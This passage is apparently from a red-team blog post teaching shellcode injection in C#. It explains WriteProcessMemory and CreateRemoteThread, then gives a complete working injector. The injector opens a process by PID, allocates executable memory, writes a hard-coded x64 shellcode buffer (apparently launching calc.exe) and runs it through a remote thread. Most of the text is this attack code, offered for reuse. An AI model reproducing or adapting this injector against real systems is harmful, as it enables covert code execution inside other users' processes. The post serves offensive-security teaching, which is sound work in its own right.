</pre></table></code></div></div><p>Then we can write to that process’s memory using <code class="language-plaintext highlighter-rouge">WriteProcessMemory</code>. The handle of the process is defined with the <code class="language-plaintext highlighter-rouge">OpenProcess</code> call. The base address will be the start of the memory we allocated using <code class="language-plaintext highlighter-rouge">VirtualAllocEx</code>. The buffer is the shellcode bytes, the size is the length of shellcode and the <code class="language-plaintext highlighter-rouge">bytesWritten</code> are already initialized. We can also see how many bytes get written.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="nf">WriteProcessMemory</span><span class="p">(</span><span class="n">procHandle</span><span class="p">,</span> <span class="n">init</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="k">ref</span> <span class="n">bytesWritten</span><span class="p">);</span>
<span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] Bytes Written: {0}"</span><span class="p">,</span> <span class="n">bytesWritten</span><span class="p">);</span>
</pre></table></code></div></div><p>Lastly we will use <code class="language-plaintext highlighter-rouge">CreateRemoteThread</code> to create a thread for our shellcode annd execute it. We provide it with the process handle, the thread attributes are set to zero. According to Microsoft Docs, <em>It member of the structure specifies a security descriptor for the new thread. If lpThreadAttributes is NULL, the thread gets a default security descriptor.</em> The <code class="language-plaintext highlighter-rouge">dwStackSize</code> is zero which sets the default size. We dont have any parameters so that becomes zero as well and we are going to be printing the thread ID.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre><span class="n">IntPtr</span> <span class="n">threadPTR</span> <span class="p">=</span> <span class="nf">CreateRemoteThread</span><span class="p">(</span><span class="n">procHandle</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">init</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="k">ref</span> <span class="n">lpthreadID</span><span class="p">);</span>
<span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] Thread ID: {0}"</span><span class="p">,</span> <span class="n">lpthreadID</span><span class="p">);</span>
</pre></table></code></div></div><p>Putting it all together gives us this.</p><div class="language-csharp highlighter-rouge"><div class="code-header"> <span data-label-text="C#"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
</pre><td class="rouge-code"><pre><span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">OpenProcess</span><span class="p">(</span><span class="n">UInt32</span> <span class="n">dwDesiredAccess</span><span class="p">,</span> <span class="kt">bool</span> <span class="n">bInheritHandle</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">dwProcessId</span><span class="p">);</span>

<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">VirtualAllocEx</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpAddress</span><span class="p">,</span> <span class="kt">int</span> <span class="n">dwSize</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">flAllocationType</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">flProtect</span><span class="p">);</span>

<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="kt">bool</span> <span class="nf">WriteProcessMemory</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpBaseAddress</span><span class="p">,</span> <span class="kt">byte</span><span class="p">[]</span> <span class="n">lpBuffer</span><span class="p">,</span> <span class="kt">int</span> <span class="n">nSize</span><span class="p">,</span> <span class="k">ref</span> <span class="kt">int</span> <span class="n">lpNumberOfBytesWritten</span><span class="p">);</span>

<span class="p">[</span><span class="nf">DllImport</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)]</span>
<span class="k">public</span> <span class="k">static</span> <span class="k">extern</span> <span class="n">IntPtr</span> <span class="nf">CreateRemoteThread</span><span class="p">(</span><span class="n">IntPtr</span> <span class="n">hProcess</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpThreadAttributes</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">dwStackSize</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">lpStartAddress</span><span class="p">,</span> <span class="n">IntPtr</span> <span class="n">param</span><span class="p">,</span> <span class="n">UInt32</span> <span class="n">dwCreationFlags</span><span class="p">,</span> <span class="k">ref</span> <span class="kt">int</span> <span class="n">lpThreadId</span><span class="p">);</span>

<span class="k">public</span> <span class="k">enum</span> <span class="n">State</span>
<span class="p">{</span>
  <span class="n">MEM_COMMIT</span> <span class="p">=</span> <span class="m">0x00001000</span><span class="p">,</span>
  <span class="n">MEM_RESERVE</span> <span class="p">=</span> <span class="m">0x00002000</span>
<span class="p">}</span>

<span class="k">public</span> <span class="k">enum</span> <span class="n">Protection</span>
<span class="p">{</span>
  <span class="n">PAGE_EXECUTE_READWRITE</span> <span class="p">=</span> <span class="m">0x40</span>
<span class="p">}</span>
<span class="k">public</span> <span class="k">enum</span> <span class="n">Process</span>
<span class="p">{</span>
  <span class="n">PROCESS_ALL_ACCESS</span> <span class="p">=</span> <span class="m">0x000F0000</span> <span class="p">|</span> <span class="m">0x00100000</span> <span class="p">|</span> <span class="m">0xFFFF</span><span class="p">,</span>
  <span class="n">PROCESS_CREATE_THREAD</span> <span class="p">=</span> <span class="m">0x0002</span><span class="p">,</span>
  <span class="n">PROCESS_QUERY_INFORMATION</span> <span class="p">=</span> <span class="m">0x0400</span><span class="p">,</span>
  <span class="n">PROCESS_VM_OPERATION</span> <span class="p">=</span> <span class="m">0x0008</span><span class="p">,</span>
  <span class="n">PROCESS_VM_READ</span> <span class="p">=</span> <span class="m">0x0010</span><span class="p">,</span>
  <span class="n">PROCESS_VM_WRITE</span> <span class="p">=</span> <span class="m">0x0020</span>
<span class="p">}</span>

<span class="k">static</span> <span class="k">void</span> <span class="nf">Main</span><span class="p">(</span><span class="kt">string</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span>
<span class="p">{</span>
  <span class="kt">var</span> <span class="n">desiredAccess</span> <span class="p">=</span> <span class="n">Process</span><span class="p">.</span><span class="n">PROCESS_CREATE_THREAD</span> <span class="p">|</span> <span class="n">Process</span><span class="p">.</span><span class="n">PROCESS_QUERY_INFORMATION</span> <span class="p">|</span> <span class="n">Process</span><span class="p">.</span><span class="n">PROCESS_VM_OPERATION</span> <span class="p">|</span> <span class="n">Process</span><span class="p">.</span><span class="n">PROCESS_VM_READ</span> <span class="p">|</span> <span class="n">Process</span><span class="p">.</span><span class="n">PROCESS_VM_WRITE</span><span class="p">;</span>
  <span class="kt">byte</span><span class="p">[]</span> <span class="n">buf</span> <span class="p">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="p">[</span><span class="m">276</span><span class="p">]</span> <span class="p">{</span>
      <span class="m">0xfc</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x83</span><span class="p">,</span><span class="m">0xe4</span><span class="p">,</span><span class="m">0xf0</span><span class="p">,</span><span class="m">0xe8</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x51</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x50</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span>
      <span class="m">0x51</span><span class="p">,</span><span class="m">0x56</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0xd2</span><span class="p">,</span><span class="m">0x65</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x60</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x18</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span>
      <span class="m">0x8b</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x72</span><span class="p">,</span><span class="m">0x50</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x0f</span><span class="p">,</span><span class="m">0xb7</span><span class="p">,</span><span class="m">0x4a</span><span class="p">,</span><span class="m">0x4a</span><span class="p">,</span><span class="m">0x4d</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0xc9</span><span class="p">,</span>
      <span class="m">0x48</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span><span class="m">0xac</span><span class="p">,</span><span class="m">0x3c</span><span class="p">,</span><span class="m">0x61</span><span class="p">,</span><span class="m">0x7c</span><span class="p">,</span><span class="m">0x02</span><span class="p">,</span><span class="m">0x2c</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0xc1</span><span class="p">,</span><span class="m">0xc9</span><span class="p">,</span><span class="m">0x0d</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span>
      <span class="m">0x01</span><span class="p">,</span><span class="m">0xc1</span><span class="p">,</span><span class="m">0xe2</span><span class="p">,</span><span class="m">0xed</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x51</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x42</span><span class="p">,</span><span class="m">0x3c</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span>
      <span class="m">0x01</span><span class="p">,</span><span class="m">0xd0</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x80</span><span class="p">,</span><span class="m">0x88</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x85</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span><span class="m">0x74</span><span class="p">,</span><span class="m">0x67</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span>
      <span class="m">0xd0</span><span class="p">,</span><span class="m">0x50</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x18</span><span class="p">,</span><span class="m">0x44</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x40</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x49</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd0</span><span class="p">,</span><span class="m">0xe3</span><span class="p">,</span><span class="m">0x56</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span>
      <span class="m">0xff</span><span class="p">,</span><span class="m">0xc9</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x34</span><span class="p">,</span><span class="m">0x88</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd6</span><span class="p">,</span><span class="m">0x4d</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0xc9</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0xc0</span><span class="p">,</span>
      <span class="m">0xac</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0xc1</span><span class="p">,</span><span class="m">0xc9</span><span class="p">,</span><span class="m">0x0d</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xc1</span><span class="p">,</span><span class="m">0x38</span><span class="p">,</span><span class="m">0xe0</span><span class="p">,</span><span class="m">0x75</span><span class="p">,</span><span class="m">0xf1</span><span class="p">,</span><span class="m">0x4c</span><span class="p">,</span><span class="m">0x03</span><span class="p">,</span><span class="m">0x4c</span><span class="p">,</span>
      <span class="m">0x24</span><span class="p">,</span><span class="m">0x08</span><span class="p">,</span><span class="m">0x45</span><span class="p">,</span><span class="m">0x39</span><span class="p">,</span><span class="m">0xd1</span><span class="p">,</span><span class="m">0x75</span><span class="p">,</span><span class="m">0xd8</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x44</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x40</span><span class="p">,</span><span class="m">0x24</span><span class="p">,</span><span class="m">0x49</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd0</span><span class="p">,</span>
      <span class="m">0x66</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x0c</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x44</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x40</span><span class="p">,</span><span class="m">0x1c</span><span class="p">,</span><span class="m">0x49</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd0</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x04</span><span class="p">,</span>
      <span class="m">0x88</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0xd0</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x5e</span><span class="p">,</span><span class="m">0x59</span><span class="p">,</span><span class="m">0x5a</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x59</span><span class="p">,</span>
      <span class="m">0x41</span><span class="p">,</span><span class="m">0x5a</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x83</span><span class="p">,</span><span class="m">0xec</span><span class="p">,</span><span class="m">0x20</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x52</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xe0</span><span class="p">,</span><span class="m">0x58</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x59</span><span class="p">,</span><span class="m">0x5a</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span>
      <span class="m">0x8b</span><span class="p">,</span><span class="m">0x12</span><span class="p">,</span><span class="m">0xe9</span><span class="p">,</span><span class="m">0x57</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0x5d</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0xba</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span>
      <span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x8d</span><span class="p">,</span><span class="m">0x8d</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0x01</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0xba</span><span class="p">,</span><span class="m">0x31</span><span class="p">,</span><span class="m">0x8b</span><span class="p">,</span><span class="m">0x6f</span><span class="p">,</span>
      <span class="m">0x87</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span><span class="m">0xbb</span><span class="p">,</span><span class="m">0xf0</span><span class="p">,</span><span class="m">0xb5</span><span class="p">,</span><span class="m">0xa2</span><span class="p">,</span><span class="m">0x56</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0xba</span><span class="p">,</span><span class="m">0xa6</span><span class="p">,</span><span class="m">0x95</span><span class="p">,</span><span class="m">0xbd</span><span class="p">,</span><span class="m">0x9d</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span>
      <span class="m">0xd5</span><span class="p">,</span><span class="m">0x48</span><span class="p">,</span><span class="m">0x83</span><span class="p">,</span><span class="m">0xc4</span><span class="p">,</span><span class="m">0x28</span><span class="p">,</span><span class="m">0x3c</span><span class="p">,</span><span class="m">0x06</span><span class="p">,</span><span class="m">0x7c</span><span class="p">,</span><span class="m">0x0a</span><span class="p">,</span><span class="m">0x80</span><span class="p">,</span><span class="m">0xfb</span><span class="p">,</span><span class="m">0xe0</span><span class="p">,</span><span class="m">0x75</span><span class="p">,</span><span class="m">0x05</span><span class="p">,</span><span class="m">0xbb</span><span class="p">,</span>
      <span class="m">0x47</span><span class="p">,</span><span class="m">0x13</span><span class="p">,</span><span class="m">0x72</span><span class="p">,</span><span class="m">0x6f</span><span class="p">,</span><span class="m">0x6a</span><span class="p">,</span><span class="m">0x00</span><span class="p">,</span><span class="m">0x59</span><span class="p">,</span><span class="m">0x41</span><span class="p">,</span><span class="m">0x89</span><span class="p">,</span><span class="m">0xda</span><span class="p">,</span><span class="m">0xff</span><span class="p">,</span><span class="m">0xd5</span><span class="p">,</span><span class="m">0x63</span><span class="p">,</span><span class="m">0x61</span><span class="p">,</span><span class="m">0x6c</span><span class="p">,</span>
      <span class="m">0x63</span><span class="p">,</span><span class="m">0x2e</span><span class="p">,</span><span class="m">0x65</span><span class="p">,</span><span class="m">0x78</span><span class="p">,</span><span class="m">0x65</span><span class="p">,</span><span class="m">0x00</span> <span class="p">};</span>
    <span class="kt">int</span> <span class="n">shellcode_size</span> <span class="p">=</span> <span class="n">buf</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">bytesWritten</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">lpthreadID</span> <span class="p">=</span> <span class="m">0</span><span class="p">;</span>
    <span class="n">IntPtr</span> <span class="n">procHandle</span> <span class="p">=</span> <span class="nf">OpenProcess</span><span class="p">((</span><span class="kt">uint</span><span class="p">)</span><span class="n">desiredAccess</span><span class="p">,</span> <span class="k">false</span><span class="p">,</span> <span class="n">Convert</span><span class="p">.</span><span class="nf">ToUInt32</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="m">0</span><span class="p">]));</span>
    <span class="n">IntPtr</span> <span class="n">init</span> <span class="p">=</span> <span class="nf">VirtualAllocEx</span><span class="p">(</span><span class="n">procHandle</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span><span class="n">State</span><span class="p">.</span><span class="n">MEM_COMMIT</span> <span class="p">|</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span><span class="n">State</span><span class="p">.</span><span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="p">(</span><span class="kt">uint</span><span class="p">)</span><span class="n">Protection</span><span class="p">.</span><span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">);</span>
    <span class="nf">WriteProcessMemory</span><span class="p">(</span><span class="n">procHandle</span><span class="p">,</span> <span class="n">init</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="n">shellcode_size</span><span class="p">,</span> <span class="k">ref</span> <span class="n">bytesWritten</span><span class="p">);</span>
    <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] Bytes Written: {0}"</span><span class="p">,</span> <span class="n">bytesWritten</span><span class="p">);</span>
    <span class="n">IntPtr</span> <span class="n">threadPTR</span> <span class="p">=</span> <span class="nf">CreateRemoteThread</span><span class="p">(</span><span class="n">procHandle</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="n">init</span><span class="p">,</span> <span class="n">IntPtr</span><span class="p">.</span><span class="n">Zero</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="k">ref</span> <span class="n">lpthreadID</span><span class="p">);</span>
    <span class="n">Console</span><span class="p">.</span><span class="nf">WriteLine</span><span class="p">(</span><span class="s">"[*] Thread ID: {0}"</span><span class="p">,</span> <span class="n">lpthreadID</span><span class="p">);</span>
<span class="p">}</span>
</pre></table></code></div></div><p>We can take a process ID from Task Manager. And executing it gives us. <br /> <img data-src="/assets/img/shellcode-injections/exec_proc_inject.png" alt="Executing Process Injection" data-proofer-ignore> <br /> A cleaner and improvered version can be found <a href="https://gist.github.com/crypt0ace/4d03eaaac958d73bb665f4ca7d068a68">here</a>. The x86 shellcode part doesnt work btw (yet).</p></div><div class="post-tail-wrapper text-muted"><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/red-team/" class="post-tag no-text-decoration" >Red Team</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Shellcode+Injection+in+C%23+-+Part+1+-+Process+Injection+-+Crypt0ace&url=https%3A%2F%2Fcrypt0ace.github.io%2Fposts%2FShellcode-Injection-Techniques%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Shellcode+Injection+in+C%23+-+Part+1+-+Process+Injection+-+Crypt0ace&u=https%3A%2F%2Fcrypt0ace.github.io%2Fposts%2FShellcode-Injection-Techniques%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fcrypt0ace.github.io%2Fposts%2FShellcode-Injection-Techniques%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/NHA-Part-3/">AD Pwnage: Ninja Hackers Academy Part 3</a><li><a href="/posts/NHA-Part-2/">AD Pwnage: Ninja Hackers Academy Part 2</a><li><a href="/posts/Using-DInvoke-For-Offensive-Tool-Development/">Using D/Invoke for Offensive Tool Development in C#</a><li><a href="/posts/Staying-under-the-Radar-Part-2/">Staying Under the Radar - Part 2 - Hiding IAT using Delegates</a><li><a href="/posts/Shellcode-Injection-Techniques/">Shellcode Injection in C# - Part 1 - Process Injection</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/red-team/">Red Team</a> <a class="post-tag" href="/tags/write-ups/">Write-Ups</a> <a class="post-tag" href="/tags/funbox-series/">Funbox Series</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Shellcode-Injection-Techniques-Part-2/"><div class="card-body"> <em class="small" data-ts="1662663600" data-df="ll" > Sep 9, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shellcode Injection in C# - Part 2 - Process Hollowing</h3><div class="text-muted small"><p> Introduction This post is part 2 of shellcode injection techniques. You can read part 1 here. In this one, we will look into Process Hollowing in C#. Process Hollowing Process Hollowing is a techn...</p></div></div></a></div><div class="card"> <a href="/posts/Shellcode-Injection-Techniques-Part-3/"><div class="card-body"> <em class="small" data-ts="1663268400" data-df="ll" > Sep 16, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shellcode Injection in C# - Part 3 - QueueUserAPC | EarlyBird</h3><div class="text-muted small"><p> Introduction In this post we are going to look at another method for shellcode execution. THis involves using the API call QueueUserAPC. Like previous Process Hollowing, in this we are going to ope...</p></div></div></a></div><div class="card"> <a href="/posts/Staying-under-the-Radar/"><div class="card-body"> <em class="small" data-ts="1663441200" data-df="ll" > Sep 18, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Staying Under the Radar - Part 1 - PPID Spoofing and Blocking DLLs</h3><div class="text-muted small"><p> Introduction In this post we are going to look at two “features” (lol) that Microsoft provided which can allow us to spoof our parent process ID and also block third party DLLs that are not Microso...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/WinAPI-and-PInvoke-in-CSharp/" class="btn btn-outline-primary" prompt="Older"><p>WinAPI and P/Invoke in C#</p></a> <a href="/posts/Shellcode-Injection-Techniques-Part-2/" class="btn btn-outline-primary" prompt="Newer"><p>Shellcode Injection in C# - Part 2 - Process Hollowing</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/crypt0acee">Ahmed Sher</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/red-team/">Red Team</a> <a class="post-tag" href="/tags/write-ups/">Write-Ups</a> <a class="post-tag" href="/tags/funbox-series/">Funbox Series</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 